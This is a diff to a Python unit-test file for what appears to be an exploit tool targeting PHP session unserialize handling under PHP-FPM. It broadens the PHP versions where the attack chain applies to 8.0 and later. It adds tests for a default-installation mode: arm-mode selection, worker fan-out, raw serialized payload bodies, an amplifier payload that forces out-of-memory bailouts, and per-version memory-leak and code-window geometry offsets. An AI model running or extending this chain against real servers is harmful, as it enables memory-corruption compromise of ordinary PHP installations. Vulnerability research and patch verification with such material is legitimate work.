@@ -347,15 +347,18 @@ class VersionRegistryTests(unittest.TestCase):
                 self.assertTrue(versions.is_vulnerable(version))
                 self.assertIsNone(versions.fixed_in(version))
 
-    def test_chain_requires_php_82(self):
-        """php_session_cancel_decode only exists from PHP 8.2 on: before it
-        the bailout never frees the unserialize struct."""
-        for version in ("5.4.45", "5.5.38", "5.6.40", "7.2.34",
-                         "7.4.33", "8.0.30", "8.1.33"):
+    def test_chain_applies_from_php_80(self):
+        """The stale BG(unserialize) struct is reclaimed on every branch
+        from PHP 8.0 on: php_var_unserialize_init reuses it whenever
+        level > 0, the Zend memory manager frees the emalloc block at
+        request end, and php_session_cancel_decode (8.2+) only unlinks the
+        session file.  Verified end to end on 8.0.30 and 8.1.33; 5.x and
+        7.x keep the session-file plant until a chain run proves them."""
+        for version in ("5.4.45", "5.5.38", "5.6.40", "7.2.34", "7.4.33"):
             with self.subTest(version=version):
                 self.assertFalse(versions.chain_applies(version))
                 self.assertTrue(versions.is_vulnerable(version))
-        for version in ("8.2.34", "8.3.35", "8.4.26"):
+        for version in ("8.0.30", "8.1.33", "8.2.34", "8.3.35", "8.4.26"):
             with self.subTest(version=version):
                 self.assertTrue(versions.chain_applies(version))
 
@@ -676,3 +679,166 @@ class PieCodeWindowTests(unittest.TestCase):
 
     def test_window_constant_matches_the_shipped_geometry(self):
         self.assertEqual(fpm.PIE_CODE_WINDOW, self.WINDOW)
+
+
+class DefaultModeTests(unittest.TestCase):
+    """Single-origin, amplifier-arm and worker-fanout behaviour.
+
+    These are the pieces that let the chain run against a stock
+    installation: one port (builder prefix), --arm-mode auto picking the
+    growth/amplifier arm when both URLs share an origin, a decode-side
+    amplifier payload instead of a two-pool memory split, and a consume
+    fan-out sized like a default pm=dynamic pool.
+    """
+
+    def setUp(self):
+        self._saved = (
+            fpm.ARM_MODE, fpm.BUILDER_PREFIX, fpm.WORKERS,
+            dict(fpm.PATHS), fpm._probe_usable, fpm._amplifier_usable,
+            dict(fpm._amplifier_cache),
+        )
+
+    def tearDown(self):
+        (fpm.ARM_MODE, fpm.BUILDER_PREFIX, fpm.WORKERS, paths,
+         fpm._probe_usable, fpm._amplifier_usable, cache) = (
+            *self._saved[:3], self._saved[3], self._saved[4],
+            self._saved[5], self._saved[6])
+        fpm.PATHS.clear()
+        fpm.PATHS.update(paths)
+        fpm._amplifier_cache.clear()
+        fpm._amplifier_cache.update(cache)
+
+    @staticmethod
+    def _args(**extra):
+        base = dict(
+            base="http://t:8080", builder=None, builder_prefix="",
+            arm_mode="auto", workers=5, grow_chunk=0, grow_max=0,
+            arm_body=0, app_path=None, arm_path=None, ref_path=None,
+            probe_path=None, grow_path=None, session_cookie=None,
+        )
+        base.update(extra)
+        return SimpleNamespace(**base)
+
+    def test_auto_same_origin_selects_growth(self):
+        fpm.configure_paths(self._args())
+        self.assertEqual(fpm.ARM_MODE, "growth")
+
+    def test_auto_two_origins_selects_builder(self):
+        fpm.configure_paths(self._args(builder="http://t:8081"))
+        self.assertEqual(fpm.ARM_MODE, "builder")
+
+    def test_auto_with_builder_prefix_selects_builder(self):
+        fpm.configure_paths(self._args(builder_prefix="/b"))
+        self.assertEqual(fpm.ARM_MODE, "builder")
+
+    def test_explicit_arm_mode_wins(self):
+        fpm.configure_paths(self._args(arm_mode="builder"))
+        self.assertEqual(fpm.ARM_MODE, "builder")
+
+    def test_cli_default_fans_out_over_five_workers(self):
+        fpm.configure_paths(self._args())
+        self.assertEqual(fpm.WORKERS, 5)
+
+    def test_missing_workers_falls_back_to_one(self):
+        args = self._args()
+        del args.workers
+        fpm.configure_paths(args)
+        self.assertEqual(fpm.WORKERS, 1)
+
+    def test_builder_target_applies_prefix_chain_does_not(self):
+        fpm.configure_paths(self._args(builder_prefix="/b"))
+        builder = fpm.builder_target("http://t:8080")
+        self.assertEqual(builder._p(builder.path), "/b/")
+        self.assertEqual(builder._p("/bigvar.php"), "/b/bigvar.php")
+        chain = fpm.Target("http://t:8080")
+        self.assertEqual(chain._p("/bigvar.php"), "/bigvar.php")
+
+    def test_post_raw_sends_braces_unencoded(self):
+        captured = {}
+
+        def fake_exch(req, read_cap=1 << 22, timeout=None):
+            captured["req"] = req
+            return 200, {}, b"GROW_OK 0 B0"
+
+        with mock.patch.object(fpm.Target, "_exch", side_effect=fake_exch):
+            target = fpm.Target("http://t:8080")
+            target.post_raw("/grow.php", b"p=a:1:{i:0;N;}")
+        req = captured["req"]
+        self.assertIn(b"p=a:1:{i:0;N;}", req)
+        self.assertNotIn(b"%7B", req)
+
+    def test_amplifier_payload_shape(self):
+        payload = fpm._amplifier_payload(8200000)
+        # short strings first: the leak's R:2 hook reads data[1]
+        self.assertTrue(payload.startswith(b'a|s:2000:"'))
+        self.assertGreater(payload.count(b'|s:2000:"'), 1)
+        # exactly one array key, no doubled "k|" prefix
+        self.assertEqual(payload.count(b"k|a:"), 1)
+        # non-empty nested children (PHP interns a:0:{}, they would be free)
+        self.assertIn(b"a:1:{i:0;a:1:{i:0;N;}}", payload)
+        self.assertLessEqual(len(payload), 8200000 + 64)
+
+    def test_amplifier_payload_is_cached(self):
+        first = fpm._amplifier_payload(100000)
+        self.assertIs(first, fpm._amplifier_payload(100000))
+
+    def test_grow_size_parses_only_the_session_bytes(self):
+        self.assertEqual(fpm._grow_size(b"GROW_OK 60751872 B8200000 UL1"),
+                         60751872)
+
+    def test_amplifier_arm_detects_oom(self):
+        target = fpm.Target("http://t:8080")
+        with mock.patch.object(target, "post_raw",
+                               return_value=(200, {}, b"")) as post:
+            self.assertIs(fpm._amplifier_arm(target, b"sid"), True)
+            self.assertEqual(post.call_count, 1)
+
+    def test_amplifier_arm_skips_413_and_caches_usable_body(self):
+        target = fpm.Target("http://t:8080")
+
+        def responder(path, body, cookie=None, timeout=None):
+            size = len(body) - 2     # "p="
+            if size > 3000000:
+                return 413, {}, b""
+            # full body arrived, decode survived
+            return 200, {}, b"GROW_OK 0 B%d" % size
+
+        with mock.patch.object(target, "post_raw", side_effect=responder):
+            self.assertIsNone(fpm._amplifier_arm(target, b"sid"))
+        self.assertEqual(fpm._amplifier_usable, 3000000)
+        # second call goes straight at the cached size
+        with mock.patch.object(target, "post_raw",
+                               side_effect=responder) as post:
+            fpm._amplifier_arm(target, b"sid")
+            self.assertEqual(post.call_count, 1)
+
+    def test_amplifier_arm_reports_discarded_bodies_as_false(self):
+        target = fpm.Target("http://t:8080")
+
+        def responder(path, body, cookie=None, timeout=None):
+            # post_max_size below every ladder rung: body never arrives
+            return 200, {}, b"GROW_OK 0 B0"
+
+        with mock.patch.object(target, "post_raw", side_effect=responder):
+            self.assertIs(fpm._amplifier_arm(target, b"sid"), False)
+
+    def test_growth_mode_reads_growth_geometry(self):
+        # 8.4.26 ships both: classic two-surface (CI lab) and the
+        # single-surface amplifier arm calibrated on the default-install lab
+        fpm.configure_paths(self._args())          # auto -> growth
+        leak = fpm._leak_geometry("8.4.26")
+        self.assertEqual(leak["read_len"], 0x1C000)
+        size, candidates, pads = fpm._no_oracle_geometry("8.4.26")
+        self.assertEqual(size, 16384)
+        self.assertEqual(candidates[0], (0x81000, 0xFE8))
+        self.assertEqual(pads, [4096, 4096, 4096])
+
+    def test_builder_mode_keeps_classic_geometry(self):
+        fpm.configure_paths(self._args(arm_mode="builder"))
+        leak = fpm._leak_geometry("8.4.26")
+        self.assertEqual(leak["read_len"], 0x15810)
+        self.assertEqual(leak["chunk_ptr_off"], 0x77F8)
+        size, candidates, pads = fpm._no_oracle_geometry("8.4.26")
+        self.assertEqual(size, 16384)
+        self.assertEqual(candidates[0], (0x7F000, 0xFE8))
+        self.assertEqual(pads, [4096, 4096])
